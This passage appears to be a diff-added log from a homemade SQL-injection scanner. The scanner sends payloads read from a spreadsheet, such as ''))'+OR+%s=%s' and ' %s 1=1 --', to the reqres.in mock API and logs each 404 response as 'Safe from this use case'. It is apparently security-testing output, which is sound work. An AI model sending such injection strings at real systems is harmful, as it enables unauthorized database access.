h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 11 = "))\'+OR+%s=%s"%(r_time(),r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:32 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'10\', \'cf-request-id\': \'0a58bf682e00000e582a1a7000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=C2OzO1bwm6w2Cm0Ba%2FZ%2B5N3j6sU75gATWv6gd%2FROFmR3TT5aqTBcB5XFU3mlhMwe%2FStcAmKxAVFbvkhYlM%2F97lSlEqzZQNy9PfkyHEpdaNx076QxUod7"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34ed1e230e58-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"))\'+OR+%s=%s"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:32 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf68aa000031a565871000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=CRwH2eJbyK8pLkvL5pem59YZUixjVzp71s3kbKCgZfhlgF7mcJQmbE4saYn2J9U97NwufOaEetbkOChnlWt7BNoPFTls%2BAk6KevOqodSVbqiEodGQoDN"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34eddeba31a5-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "))\'+OR+%s=%s"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:32 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf6a3c00002e1cc334e000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=dLtnF0ObKOWDKvMYP8UmdUoOOhz70blxJ3atTRaz968%2B2X%2B%2FEnGOjPNKZBobjKupL8I%2BAvxhGLbaHvlfZbvMhT0%2BNd5nRe8zH7v3qG0aDZzcUhaXuXP1"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34f06bc92e1c-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 12 = "))) AND %s=%s"%(r_time(),r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:33 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'11\', \'cf-request-id\': \'0a58bf6c1600000dd8f0986000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=n3l%2B%2FEK3xll4y2YTARppFEtf%2FIbRIGDxipl3mP%2B9GKFQZqIlirFnTvcv3bky%2FOay5uGkvlvWU7R1U9GcNt9pacdgI85uZ6tuOAin7oFVUA1nSLasT2tk"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34f359860dd8-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"))) AND %s=%s"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:33 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf6cef00002e11b0263000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=P73GSq3Yc80BF3%2FCybELVJ8Ygyg97GxSeMNknPu9jMX7hRytm9PbwVN1kI6t1VMCXI8%2FGJT3ISUzCIlp%2Bij1tw9HaAqW9D2a5IB9L2gS12l3YWHq0OS6"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34f4bf5d2e11-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "))) AND %s=%s"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:33 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf6ea500002e596a333000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=aUai4iv31CQeMFU%2FTtBboBebYg4qU%2Bz%2FOnHrlQ7xBjzaqrZu4fgK6YflbOvOuKAV9mN6GW5sCdXiiW17GMrUr8y2BWlZi5zU%2BydWmussc2VEUrvPgL4C"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34f76d2e2e59-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 13 = "; OR \'%s\'=\'%s\'"%(r_time(),r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:34 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'12\', \'cf-request-id\': \'0a58bf711800002e5eec3d6000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=t2QuTR3O2ADDLAwG1WrZTbdj9ftxDIfat2Db80SB9xuZWM718cKnh2ZZr8o9poymX7XeOvGwfEf6V0Xf4P0dZJwiwk9K9g%2BPbyktwbXG1nH1gxd7oF3L"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34fb5d052e5e-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"; OR \'%s\'=\'%s\'"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:34 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf71fc00000ef8c62df000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=1%2BVDRVy6K5RcCgtDl5d3hAsXg6Mx%2BfCA%2BC6YOUo6puHdS03yi3x%2B3wB4uFUYiscfVgeWzRndp3biAL96uNSUXVjfj3%2BVbGUhCSkAKORdSBr7M%2FDbvc4s"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34fcc9430ef8-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "; OR \'%s\'=\'%s\'"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:35 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'x-powered-by\': \'Express\', \'access-control-allow-origin\': \'*\', \'etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf73f60000d5b3df29e000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=g2QqPVQOQE6i2IBdCZExS0FQxIaLVD%2BZKWtJXlSUcHSkMuvFt1nhhB4n%2FPJZeOHAOifBDE482hCaeiaBRBtp1MhhykUOAvPcvPcOiRPmRa4XMbvx6idS"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34fffc22d5b3-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 14 = "\'OR \'))%s=%s --"%(r_time(),r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:35 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'13\', \'cf-request-id\': \'0a58bf75b900002e1619130000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=wh8eQ1kElSYnsyAuY1Wz%2FWMbKY8rZSIGobMfIqWdiS0roluE3x0wbt0lxQuoChXKjw10uJ2VDuHO1gYn1piKngMqNKBrM3SMnXUS8GIZOhnQpxdRF8en"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e3502cb7a2e16-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"\'OR \'))%s=%s --"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:35 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf7611000031ee10a42000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=ukJf%2FkikBO%2BTW9%2BpPYhY5eieGBByNREHuhswRdnlzmSX50boFrVZtQIAvP9Lr%2BmKuosSFOe7kPr2ZettiAj8xL%2Ftjb%2FdXR9QesrJW2jPinQr3DVMTg4t"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e3503491431ee-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "\'OR \'))%s=%s --"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:36 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf77a200000ef0948fd000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=p58yIeKj%2FQEbFMmd5awtsaDLR3a78YMSqIL8br62LwBZZMmRAieNCfNBTJttpIXQHA8fn0Awx5JDQRsnFJrZLtqEd5LxJHdHOIF3DuVSsQsgVirgna%2B%2B"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e3505dfda0ef0-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 15 = "\'AND \')))%s=%s --#"%(r_time(),r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:36 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'14\', \'cf-request-id\': \'0a58bf794100000e78a493f000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=r%2FKXngKWZ7XhEbNh%2Fks%2BPmd5soAZAuSjbz88uW4aIssDpKrpy3Z9OE14f543gMWXm2R2tx85OssOmz6sU3ofZfNlYgSZcePZVGYmvYlNnnXFGnXkt25h"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e350869dd0e78-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"\'AND \')))%s=%s --#"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:36 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf79c200000e9469a8d000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=c61Bxq7wu5dLpS%2BNormgEIpzjeTkCsKHxi1ao7L6fhg755ao4lKk4Knlt399eLZmm2mTqeg9Kko1PJ2NiKwIl8cD7L5gyJbPS0xPn87LEJrc8AIHN6Ww"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e35093bfc0e94-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "\'AND \')))%s=%s --#"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:37 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf7b300000321eb29ce000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=cWlHe2omgMFXebDkxqh1Py4UkY4k%2BFVT9QqYw8NHdIs%2FCilQtTNBNQLF1yQYAGarY1jqKGkD8Xfnf0y%2B2Atf6ssUbx7FnJcLCQOag1GKVp6yPBI%2FLJZB"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e350b7d33321e-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 16 = " %s 1=1 --"%(r_string(20))
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:37 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'15\', \'cf-request-id\': \'0a58bf7ca20000d5976a384000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=WLHWbU7fa2hvL5psPh0vxj4UBXsKRKbnhx8zrV7QzdiWLcPm%2FhE1uU%2F48oOssoe5mnqQ7%2FLPngQ1VLQ0h4o%2FgG%2FCVKxp%2BiCkLQw0tc3y3l6Pym23JogF"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e350dcdfdd597-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2" %s 1=1 --"%(r_string(20))
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:37 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf7d1400002e477c3d8000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=CjY7ulVa4wV2STQwg%2B78WaEAapXHIDMdJbYb1URz7ygX9qJue1meRCs2Au8u3a4RHC5457SsQISYd9MP6q8AlzQaMK7kbyoA%2FnDSxgQuqR6yR17DbHXw"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e350e8e802e47-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 " %s 1=1 --"%(r_string(20))
+Its GET API
+Executed GET Method for payload
